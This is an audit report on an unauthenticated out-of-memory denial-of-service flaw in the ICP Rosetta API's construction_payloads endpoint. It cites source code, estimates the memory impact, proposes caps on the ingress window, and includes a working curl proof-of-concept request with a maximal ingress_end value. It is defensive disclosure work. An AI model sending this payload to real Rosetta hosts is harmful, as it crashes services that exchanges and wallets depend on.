Audit Report

## Title
Unbounded `ingress_expiries` Vec Allocation via Attacker-Controlled `ingress_start`/`ingress_end` Causes OOM DoS — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary
The `construction_payloads` handler in the ICP Rosetta API accepts attacker-controlled `ingress_start` and `ingress_end` values from request metadata and feeds them directly into an unbounded `while` loop that grows a `Vec<u64>` proportional to `(ingress_end - ingress_start) / interval`. No cap or validation on the window size exists. A single small HTTP POST request with a maximally-spread window causes the Rosetta process to attempt tens of gigabytes of heap allocation, triggering OOM and crashing the process — a complete denial of service for all Rosetta API consumers.

## Finding Description
The loop step `interval` is computed at [1](#0-0)  as `MAX_INGRESS_TTL (300s) − PERMITTED_DRIFT (60s) − 120s = 120s = 120,000,000,000 ns`.

`ingress_start` and `ingress_end` are read directly from the request metadata with no bounds check at [2](#0-1) .

These values are then fed into an unbounded loop at [3](#0-2)  with no iteration cap, no window-size guard, and no memory accounting.

The resulting `ingress_expiries` slice is passed to `add_payloads` at [4](#0-3) , which allocates **two** `SigningPayload` structs (each containing heap-allocated hex strings) per expiry per transaction.

The 4 MB JSON body limit at [5](#0-4)  is irrelevant: the malicious request body is tiny (two `u64` values in JSON); all unbounded allocation occurs server-side after parsing.

No existing check validates that `ingress_end - ingress_start` is within any reasonable bound.

## Impact Explanation
With `ingress_end − ingress_start ≈ i64::MAX ns (~9.22 × 10¹⁸ ns)`:

| Stage | Calculation | Size |
|---|---|---|
| Loop iterations | 9.22e18 / 1.2e11 | ~76.8 million |
| `ingress_expiries` Vec | 76.8M × 8 bytes | ~614 MB |
| `SigningPayload` objects (2 per expiry, ~200 bytes each) | 76.8M × 2 × 200 B | ~30 GB |

A single request causes the Rosetta process to attempt a ~30 GB heap allocation, triggering OOM and crashing the process. The Rosetta API is an explicitly in-scope financial integration component. This matches the allowed impact: **High — Application/platform-level DoS** and **Significant Rosetta/infrastructure security impact with concrete user or protocol harm**, as all Rosetta API consumers (exchanges, wallets, tooling) lose service with a single unauthenticated request.

## Likelihood Explanation
- No authentication is required to call `POST /construction/payloads`.
- The attacker only needs to set two numeric fields (`ingress_start`, `ingress_end`) in a standard JSON body.
- The exploit is deterministic, reproducible with a single HTTP request, and requires no special privileges or prior knowledge.
- No rate limiting or per-request memory accounting exists for this endpoint.
- `MAX_INGRESS_TTL` is confirmed as 5 minutes at [6](#0-5) , making the interval 120 seconds and the iteration count maximally large for any given window.

## Recommendation
Add a hard cap on the ingress window before the loop:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60); // 1 day
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress window exceeds maximum allowed duration",
    ));
}
```

Alternatively, cap the number of iterations directly inside the loop:

```rust
const MAX_INGRESS_EXPIRIES: usize = 1000;
while now < ingress_end {
    if ingress_expiries.len() >= MAX_INGRESS_EXPIRIES {
        return Err(ApiError::invalid_request("too many ingress expiries requested"));
    }
    // ...
}
```

The ICRC1 Rosetta implementation should be audited for the same pattern.

## Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"abc"},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"0000000000000000000000000000000000000000000000000000000000000001","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 9223372036854775807
    }
  }'
```

Observable effect: Rosetta process RSS grows rapidly to available RAM and the process is killed by the OS OOM killer. Heap growth can be confirmed by polling `/proc/<pid>/status` (`VmRSS`) during the request. A unit test can reproduce this by calling `construction_payloads` directly with these metadata values and asserting it returns an error before allocating unbounded memory.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L1048-1075)
```rust
fn add_payloads(
    payloads: &mut Vec<SigningPayload>,
    ingress_expiries: &[u64],
    account_identifier: &AccountIdentifier,
    update: &HttpCanisterUpdate,
    signature_type: SignatureType,
) {
    for ingress_expiry in ingress_expiries {
        let mut update = update.clone();
        update.ingress_expiry = *ingress_expiry;
        let message_id = update.id();
        let transaction_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(transaction_payload);
        let read_state = make_read_state_from_update(&update);
        let read_state_message_id = MessageId::from(read_state.representation_independent_hash());
        let read_state_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&read_state_message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(read_state_payload);
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L297-298)
```rust
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
```

**File:** rs/limits/src/lib.rs (L17-17)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes
```
